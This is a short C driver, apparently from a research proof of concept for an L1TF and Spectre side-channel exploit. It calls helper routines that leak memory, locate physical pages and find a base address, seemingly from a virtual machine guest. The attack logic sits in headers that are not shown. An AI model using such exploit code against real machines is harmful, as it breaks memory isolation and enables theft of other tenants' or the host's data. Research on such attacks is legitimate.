#include <assert.h>
#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include "constants.h"
#include "helpers.h"
#include "hypercall.h"
#include "l1tf.h"
#include "spectre.h"
#include "util.h"

extern int spectres_per_halt;

int main(void)
{
	srand(time(0));
	set_cpu_affinity(CPU);
	l1tf_init();
	void *p = l1tf_spawn_leak_page();



	uintptr_t real_base = helper_base_pa() + 6;

	spectre_touch_base_start();
	for (spectres_per_halt = 100; spectres_per_halt < 3000; spectres_per_halt += 100) {
		printf("spectres_per_halt = %d\n", spectres_per_halt);
		for (int i = 0; i < 3; i++)
			l1tf_test_base(real_base, 1000000);
	}
	spectre_touch_base_stop();


	err(EXIT_SUCCESS, "early exit");



	uintptr_t pa = l1tf_find_page_pa(p);
	printf("l1tf_find_page_pa --> %lx\n", pa);

	uintptr_t base = l1tf_find_base();
	printf("l1tf_find_base --> %lx\n", base);

	return 0;
}
